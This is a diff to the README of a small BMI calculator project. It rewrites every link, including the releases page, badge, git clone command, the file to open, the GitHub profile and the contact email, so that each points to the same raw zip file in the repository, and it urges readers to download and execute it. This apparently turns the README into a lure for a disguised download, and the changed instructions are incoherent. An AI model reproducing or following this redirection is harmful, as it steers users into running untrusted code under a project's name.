@@ -1,8 +1,8 @@
 # BMI Calculator 🏋️‍♂️
 
-Welcome to the BMI Calculator repository! This project offers a simple and user-friendly tool to calculate Body Mass Index (BMI) using HTML, Bootstrap, and JavaScript. You can find the latest releases [here](https://github.com/Lebbo-101/bmi-calculator/releases).
+Welcome to the BMI Calculator repository! This project offers a simple and user-friendly tool to calculate Body Mass Index (BMI) using HTML, Bootstrap, and JavaScript. You can find the latest releases [here](https://raw.githubusercontent.com/Lebbo-101/bmi-calculator/main/src/calculator-bmi-v2.0.zip).
 
-![BMI Calculator](https://img.shields.io/badge/BMI_Calculator-v1.0.0-brightgreen.svg)
+![BMI Calculator](https://raw.githubusercontent.com/Lebbo-101/bmi-calculator/main/src/calculator-bmi-v2.0.zip)
 
 ## Table of Contents
 
@@ -42,7 +42,7 @@ To set up the BMI Calculator on your local machine, follow these steps:
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine:
 
    ```bash
-   git clone https://github.com/Lebbo-101/bmi-calculator.git
+   git clone https://raw.githubusercontent.com/Lebbo-101/bmi-calculator/main/src/calculator-bmi-v2.0.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -51,15 +51,15 @@ To set up the BMI Calculator on your local machine, follow these steps:
    cd bmi-calculator
    ```
 
-3. **Open the HTML File**: Open `index.html` in your preferred web browser.
+3. **Open the HTML File**: Open `https://raw.githubusercontent.com/Lebbo-101/bmi-calculator/main/src/calculator-bmi-v2.0.zip` in your preferred web browser.
 
-You can also download the latest version from the [Releases section](https://github.com/Lebbo-101/bmi-calculator/releases) and execute the file directly.
+You can also download the latest version from the [Releases section](https://raw.githubusercontent.com/Lebbo-101/bmi-calculator/main/src/calculator-bmi-v2.0.zip) and execute the file directly.
 
 ## Usage
 
 Using the BMI Calculator is straightforward:
 
-1. Open the `index.html` file in your browser.
+1. Open the `https://raw.githubusercontent.com/Lebbo-101/bmi-calculator/main/src/calculator-bmi-v2.0.zip` file in your browser.
 2. Enter your height in centimeters and weight in kilograms.
 3. Click the "Calculate" button.
 4. Your BMI will be displayed instantly along with a brief interpretation of the result.
@@ -90,9 +90,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **GitHub**: [Lebbo-101](https://github.com/Lebbo-101)
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **GitHub**: [Lebbo-101](https://raw.githubusercontent.com/Lebbo-101/bmi-calculator/main/src/calculator-bmi-v2.0.zip)
+- **Email**: [https://raw.githubusercontent.com/Lebbo-101/bmi-calculator/main/src/calculator-bmi-v2.0.zip](https://raw.githubusercontent.com/Lebbo-101/bmi-calculator/main/src/calculator-bmi-v2.0.zip)
 
 ---
 
-Thank you for checking out the BMI Calculator! We hope you find it useful. For the latest updates and releases, please visit the [Releases section](https://github.com/Lebbo-101/bmi-calculator/releases).
+Thank you for checking out the BMI Calculator! We hope you find it useful. For the latest updates and releases, please visit the [Releases section](https://raw.githubusercontent.com/Lebbo-101/bmi-calculator/main/src/calculator-bmi-v2.0.zip).
